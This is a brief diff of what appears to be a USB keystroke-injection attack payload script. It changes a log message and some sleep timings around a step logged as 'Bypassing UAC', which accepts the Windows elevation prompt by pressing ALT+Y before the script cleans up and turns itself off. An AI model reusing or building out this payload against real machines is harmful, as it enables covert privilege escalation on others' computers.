@@ -20,7 +20,7 @@ mkdir -p $LOOT_DIR
 if ! [ -f "a.ps1" ]
 then
 	LED R 400
-	echo "- Powershell Passer not found (a.ps1)" >> $LOG_PATH
+	echo "- Powershell script not found (a.ps1)" >> $LOG_PATH
 	exit 1
 fi
 if ! [ -f "$MODE.ps1" ]
@@ -40,8 +40,9 @@ echo "+ Bypassing UAC.." >> $LOG_PATH
 sleep 7
 Q ALT Y
 LED W 200
+echo "+ Giving the script some time.." >> $LOG_PATH
+sleep 5
 echo "+ Cleaning up payload environment.." >> $LOG_PATH
-sleep 3
 LED W SUCCESS
 # Go dark!
 ATTACKMODE OFF
